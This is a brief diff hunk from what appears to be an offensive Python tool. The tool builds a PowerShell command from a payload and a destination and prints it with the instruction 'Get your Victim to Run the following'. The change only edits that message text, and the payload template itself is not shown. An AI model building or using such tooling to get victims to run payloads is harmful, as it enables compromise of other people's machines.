@@ -28,7 +28,7 @@ def __main__():
     old = powershell_.replace("{source}", payload)
     new = old.replace("{dest}", dest)
    
-    print("[ "+stamp+" ] "+Fore.LIGHTCYAN_EX + ">> Get your Victim to Run the following code"+ Style.RESET_ALL)
+    print("[ "+stamp+" ] "+Fore.LIGHTCYAN_EX + ">> Get your Victim to Run the following "+ Style.RESET_ALL)
     print("[ "+stamp+" ] "+Fore.LIGHTCYAN_EX + "{code}\n".format(code=new))
 
 
